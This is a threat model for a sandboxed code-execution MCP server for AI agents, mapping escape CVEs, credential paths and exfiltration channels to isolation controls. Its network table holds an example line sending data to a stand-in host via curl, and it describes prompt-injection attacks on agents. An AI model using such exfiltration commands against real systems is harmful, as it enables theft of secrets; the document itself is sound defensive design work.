# Security Model

Sandboxed code execution MCP server for AI agents. Executes untrusted code in isolated Linux namespaces with copy-on-write filesystem.

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│ TRUSTED: User's host system                                     │
│  ├── MCP server process (Rust, runs as user)                    │
│  ├── User's credentials (~/.ssh, ~/.aws, etc.)                  │
│  └── Host kernel                                                │
├─────────────────────────────────────────────────────────────────┤
│ UNTRUSTED: Sandbox contents                                     │
│  ├── AI-generated code and commands                             │
│  ├── Repository content (code, docs, PRs, issues)               │
│  ├── Downloaded packages (npm, pip, cargo)                      │
│  └── Package install scripts (postinstall, setup.py, build.rs)  │
└─────────────────────────────────────────────────────────────────┘
```

**Data flow**: AI agent → MCP server (stdio) → sandbox namespace → results back

## Threat Hierarchy (Severity Order)

| Priority | Threat | Impact |
|----------|--------|--------|
| **P0** | Sandbox escape to host | Full system compromise |
| **P1** | Credential/secret exfiltration | Account takeover, lateral movement |
| **P2** | Arbitrary network exfiltration | Data breach via covert channels |
| **P3** | Host filesystem modification | Data loss, persistence |
| **P4** | Denial of service | Resource exhaustion, stuck sessions |

## Attack Vectors

### AI-Specific (Highest Likelihood)

| Vector | Description | Mitigation |
|--------|-------------|------------|
| **Indirect prompt injection** | Malicious instructions in README, comments, PR descriptions parsed by agent | Sandbox isolates execution regardless of how agent was tricked |
| **Repository poisoning** | Hidden unicode, invisible comments, `.cursorrules`-style backdoors | Treat all repo content as untrusted input |
| **Multi-step attacks** | Early commands prepare filesystem state exploited by later commands | Session isolation, no persistent state across sessions unless explicit |

### Package Manager Attacks

| Vector | Mechanism | Mitigation |
|--------|-----------|------------|
| npm postinstall | Arbitrary shell execution on `npm install` | Run installs inside sandbox with `--ignore-scripts` option |
| pip setup.py | Python execution for source distributions | Prefer `--only-binary :all:`, sandbox all installs |
| Cargo build.rs | Rust code execution at compile time | No complete mitigation; sandbox compilation |
| Dependency confusion | Public package shadows internal name | Not directly our problem, but sandbox limits blast radius |
| Typosquatting | `reqeusts` vs `requests` | Sandbox limits exfiltration even if installed |

### Container/Namespace Escapes

| Vector | CVE Examples | Mitigation |
|--------|--------------|------------|
| **TIOCSTI injection** | CVE-2017-5226 | `setsid()` for new session |
| User namespace kernel bugs | CVE-2024-1086, CVE-2023-32233 | Kernel updates, minimize userns if possible |
| OverlayFS capability bypass | CVE-2023-2640 (Ubuntu) | Avoid Ubuntu-patched kernels, keep kernel updated |
| /proc write escapes | CVE-2022-0492 (cgroups) | Read-only /proc/sys, no cgroup mounts |
| D-Bus escalation | CVE-2021-4034 | Never bind D-Bus sockets |
| Symlink races (TOCTOU) | CVE-2025-31133 (runc) | Atomic operations, O_NOFOLLOW during setup |
| **File descriptor inheritance** | — | Close/CLOEXEC all FDs before sandbox entry |
| **Landlock FD bypass** | — | Landlock doesn't restrict pre-opened FDs; close before restricting |

### Data Exfiltration

| Target | Location | Mitigation |
|--------|----------|------------|
| SSH keys | `~/.ssh/` | Never mount; tmpfs overlay |
| Cloud creds | `~/.aws/`, `~/.config/gcloud/`, `~/.kube/` | Never mount |
| Git credentials | `.git/config`, `~/.gitconfig`, `~/.netrc` | Sanitize or overlay |
| Environment secrets | `/proc/*/environ`, `.env` files | Fresh environment, no host env passthrough |
| GPG keys | `~/.gnupg/` | Never mount |

### Network Exfiltration

| Channel | Technique | Mitigation |
|---------|-----------|------------|
| Direct HTTP/S | `curl attacker.com/?data=...` | Domain allowlist (package registries only) |
| DNS tunneling | `base64data.attacker.com` | Fixed resolvers with iptables restrictions |
| Package registry abuse | Exfil via package publish or download params | Monitor unusual registry traffic patterns |
| Allowed domain piggyback | Discord webhooks, webhook.site if allowed | Strict allowlist, no generic webhook domains |

### Resource Exhaustion (P4)

| Vector | Mechanism | Mitigation |
|--------|-----------|------------|
| Disk filling | Writing large files to overlay upper layer | cgroups v2 disk I/O limits, tmpfs size limits |
| Memory exhaustion | Allocating unbounded memory | cgroups v2 memory limits |
| Fork bombs | Spawning unlimited processes | cgroups v2 PID limits |
| CPU starvation | Infinite loops, crypto mining | cgroups v2 CPU limits, execution timeouts |

### IPC-Based Attacks

| Vector | Description | Mitigation |
|--------|-------------|------------|
| Abstract Unix sockets | Cross-sandbox communication via abstract namespace | Landlock IPC scoping (ABI v6, kernel 6.7+) — **required** |
| Signal injection | Signals sent to processes outside sandbox | Landlock signal scoping (ABI v6) — **required** |
| Shared memory | `/dev/shm` accessible across namespaces | Fresh tmpfs for /dev/shm, IPC namespace isolation |

## Security Controls

### Required (P0/P1 Mitigations)

1. **Namespace isolation**: User, mount, PID, network, IPC, UTS namespaces via `hakoniwa`
2. **New session**: Always `setsid()` to prevent TIOCSTI terminal injection
3. **Credential isolation**: Never bind-mount `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/gcloud`
4. **File descriptor hygiene**: Close all unnecessary FDs or set `O_CLOEXEC` before fork/exec into sandbox
5. **Capability drop**: Drop all capabilities, especially CAP_SYS_ADMIN, CAP_SYS_PTRACE
6. **Fresh /dev**: Mount new devtmpfs, don't expose host TTYs
7. **Network namespace**: Isolated network; allowlisted egress only if enabled
8. **NO_NEW_PRIVS**: Set before any other restrictions to prevent privilege escalation via setuid
9. **Seccomp filter**: Block dangerous syscalls (ptrace, mount, init_module, etc.) — applied **last**
10. **cgroups v2**: Resource limits for CPU, memory, PIDs, I/O — **required**
11. **Landlock IPC scoping**: Restrict abstract Unix sockets and signals — **required** (kernel 6.7+)

**Note on Landlock ptrace restrictions**: Landlock implicitly restricts ptrace — a sandboxed process can only ptrace targets in the same or nested Landlock domain. This provides defense-in-depth alongside CAP_SYS_PTRACE dropping.

### Recommended (P2/P3 Mitigations)

1. **Landlock filesystem**: Filesystem access control as defense-in-depth; apply to **merged** overlay path
2. **Read-only base**: OverlayFS lower layer read-only, writes to tmpfs/session upper
3. **DNS control**: Fixed resolvers (e.g., 8.8.8.8, 1.1.1.1) with iptables rules restricting DNS traffic to those IPs only
4. **Timeout enforcement**: Kill long-running processes

### Configurable (User Choice)

1. **Network access**: Default isolated; opt-in allowlist for package registries
2. **Package script execution**: Document risks, recommend `--ignore-scripts`
3. **Session persistence**: Default ephemeral; opt-in persistence with cleanup

## Critical Implementation Details

### Landlock and OverlayFS Interaction

**Important**: Landlock rules applied to OverlayFS upper/lower layers do NOT automatically apply to the merged view. From kernel documentation:

> "A policy restricting an OverlayFS layer will not restrict the resulted merged hierarchy, and vice versa."

**Correct approach**: Apply Landlock rules to the **merged mount path** that the sandboxed process actually accesses, not to the underlying upper/lower directories.

```
# WRONG: Rules on layers don't protect merged view
Landlock rule: /sandboxes/session-123/upper → read-only
Merged at: /sandboxes/session-123/merged → NOT PROTECTED

# CORRECT: Rules on merged path
Landlock rule: /sandboxes/session-123/merged/sensitive → deny
```

### File Descriptor Inheritance

Landlock (and other LSMs) only restrict operations on newly opened files. File descriptors opened before `landlock_restrict_self()` retain their original permissions.

**Requirements**:
1. Close all non-essential FDs before entering sandbox
2. Set `O_CLOEXEC` on any FDs that must remain open
3. Audit FD inheritance in sandbox entry code path
4. Never pass host FDs (config files, sockets) to sandboxed process

### Security Implementation Order

The order of applying security controls matters. Incorrect ordering can either brick the sandbox setup or leave security gaps.

**Correct order**:
1. Create namespaces (user, mount, PID, network, IPC, UTS)
2. Configure network (veth pairs if egress needed)
3. Set up mounts (overlay, bind mounts, /proc, /dev)
4. Close unnecessary file descriptors
5. Apply Landlock rules (to merged paths)
6. Set `NO_NEW_PRIVS` (prevents setuid escalation)
7. Drop all capabilities
8. Install seccomp filter (**LAST** — must not block setup syscalls)

**Why seccomp last**: The seccomp filter blocks syscalls. If applied too early, it may block syscalls needed for the setup steps above (mount, setns, prctl, etc.).

### Seccomp and Network Syscalls

The seccomp allowlist includes network-related syscalls (`socket`, `connect`, `sendto`, `recvfrom`, etc.) even when network isolation is the goal. This is intentional:

1. **Network namespace provides isolation**: In an isolated network namespace, only loopback is available. Socket syscalls succeed but have no external connectivity.
2. **Local tooling may need sockets**: Some tools use Unix domain sockets or localhost connections for IPC.
3. **When egress is enabled**: The veth pair + iptables/proxy provides filtering at the network level, not syscall level.

The seccomp filter focuses on blocking dangerous syscalls (ptrace, mount, etc.), not network policy enforcement.

### DNS in Network-Enabled Sandboxes

When network egress is enabled via veth pairs:

1. Configure `/etc/resolv.conf` inside sandbox to point to well-known public resolvers (e.g., `8.8.8.8`, `1.1.1.1`)
2. Apply iptables rules on the host side of the veth pair to:
   - Allow UDP/TCP port 53 only to those specific resolver IPs
   - Block DNS to any other destination
3. This prevents DNS tunneling to attacker-controlled nameservers while allowing legitimate resolution

## Sandbox Filesystem Layout

```
/.                          # Sandbox root (overlay merged view)
├── usr/                    # Read-only from host
├── lib/, lib64/           # Read-only symlinks
├── bin/, sbin/            # Read-only from host
├── etc/                    # Minimal, sanitized
├── tmp/                    # Writable (tmpfs, size-limited)
├── home/sandbox/          # Writable (overlay upper)
│   └── workspace/         # Bind-mount to project (overlay for writes)
├── proc/                   # Fresh procfs (hidepid=invisible)
├── dev/                    # Fresh devtmpfs (minimal devices)
│   └── shm/               # Fresh tmpfs (IPC isolation)
└── sys/                    # Read-only or masked

Host-side session storage:
.mcp-sandboxes/<session-id>/
├── upper/                  # OverlayFS upper layer (writable changes)
├── work/                   # OverlayFS work directory
└── meta.json              # Session metadata (TTL, PID, created_at)
```

## Out of Scope

Threats we explicitly do NOT defend against:

- **Kernel 0-days**: We reduce attack surface but can't prevent unknown kernel bugs
- **Hardware side channels**: Spectre/Meltdown mitigations are host responsibility
- **Software timing side channels**: Timing attacks via cache/memory access patterns are out of scope
- **Malicious MCP client**: The AI agent host (Claude, etc.) is trusted
- **User misconfiguration**: If user disables protections, that's on them
- **Pre-sandbox attacks**: Vulnerabilities in MCP server itself before sandboxing
- **Cryptographic attacks**: Not in scope for this project
- **TOCTOU in overlay setup**: We use atomic operations and O_NOFOLLOW, but sophisticated races are out of scope

## Implementation Checklist

Before any sandbox execution, in this order:

- [ ] All namespaces unshared (user, mount, PID, network, IPC, UTS)
- [ ] New session established (`setsid`)
- [ ] Network configured (isolated or veth with allowlist + DNS restrictions)
- [ ] Filesystem mounts prepared (overlay merged view)
- [ ] Credential paths verified not mounted
- [ ] All unnecessary file descriptors closed
- [ ] Landlock rules applied to merged paths (if kernel supports)
- [ ] Landlock IPC scoping enabled (**required**, kernel 6.7+)
- [ ] `NO_NEW_PRIVS` set via `prctl`
- [ ] All capabilities dropped
- [ ] Resource limits set (cgroups v2) — **required**
- [ ] Timeout scheduled
- [ ] Seccomp filter installed (**last step**)

## Testing Requirements

Security-critical tests:

1. **TIOCSTI blocked**: Attempt terminal injection from sandbox, verify no effect
2. **Credential inaccessible**: Verify `~/.ssh/*` not readable from sandbox
3. **Network isolated**: Verify no connectivity when disabled; only allowlist when enabled
4. **Capability verification**: Verify `capsh --print` shows empty set in sandbox
5. **Seccomp enforcement**: Verify blocked syscalls return EPERM/SIGSYS
6. **Escape regression tests**: Reproduce known CVE patterns, verify blocked
7. **FD inheritance**: Verify no unexpected FDs inherited by sandboxed process (`ls -la /proc/self/fd/`)
8. **Landlock merged path**: Verify Landlock restrictions apply to overlay merged view
9. **IPC isolation**: Verify abstract Unix socket connections fail across sandbox boundaries
10. **Resource limits**: Verify cgroups limits enforced (memory, PIDs, CPU)
11. **DNS restrictions**: Verify DNS queries only reach allowed resolvers

## Incident Response

If sandbox escape is discovered:

1. Document reproduction steps
2. Check if similar vector in known CVE databases
3. Identify which layer failed (namespace, seccomp, Landlock, etc.)
4. Add specific mitigation and regression test
5. Consider if architecture change needed

---

*Last updated: 2025-12-24*
*Review triggers: kernel updates, new escape CVEs, architecture changes*